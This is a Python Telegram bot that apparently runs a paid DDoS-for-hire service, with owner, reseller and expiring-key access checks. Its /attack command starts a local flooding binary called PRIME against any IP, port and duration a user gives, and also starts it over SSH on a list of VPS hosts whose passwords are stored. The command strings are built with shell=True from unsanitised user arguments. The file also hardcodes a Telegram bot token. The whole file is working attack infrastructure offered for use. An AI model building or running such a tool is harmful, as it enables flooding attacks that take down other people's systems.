import os, time, json, paramiko, random, string, threading, subprocess
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update

# ==================== CONFIG (AUTO-DETECT) ====================
# Railway Variables se data lega
TELEGRAM_TOKEN = os.getenv("API_KEY", "8348509991:AAGY_0IqOJH8K2VZnWSQEF2VygFSAcS6ZN4")

# ID ko text ki tarah handle karenge taaki crash na ho
OWNER_ID = str(os.getenv("OWNER_ID", "2109683176"))
# ==============================================================

FILES = ["vps.json", "users.json", "keys.json", "resellers.json"]
for f in FILES: 
    if not os.path.exists(f): 
        with open(f, 'w') as out: json.dump({} if "vps" not in f else [], out)

def load_data(file):
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_data(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=2)

def is_auth(uid):
    uid_str = str(uid)
    # Owner check (String comparison for safety)
    if uid_str == OWNER_ID: return True
    
    resellers = load_data("resellers.json")
    if uid_str in resellers: return True
    
    users = load_data("users.json")
    if uid_str in users and users[uid_str].get('expiry', 0) > time.time():
        return True
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_auth(update.effective_user.id):
        await update.message.reply_text(f"❌ Access Denied\nYour ID: {update.effective_user.id}")
        return
    await update.message.reply_text("⚔️ PRIME-V6 MASTER ONLINE\n\n🚀 /attack <ip> <port> <time>")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_auth(update.effective_user.id): return
    if len(context.args) < 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return
    
    ip, port, dur = context.args
    await update.message.reply_text(f"🚀 Attack Sent to {ip}:{port} for {dur}s")
    
    # Local Attack
    subprocess.Popen(f"./PRIME {ip} {port} {dur}", shell=True)
    
    # VPS Attack
    vps_servers = load_data("vps.json")
    for vps in vps_servers:
        threading.Thread(target=ssh_exec, args=(vps, ip, port, dur)).start()

def ssh_exec(vps, ip, port, dur):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=5)
        ssh.exec_command(f"chmod +x PRIME && nohup ./PRIME {ip} {port} {dur} > /dev/null 2>&1 &")
        ssh.close()
    except: pass

if __name__ == "__main__":
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    print("🔥 Bot Started Successfully!")
    app.run_polling()
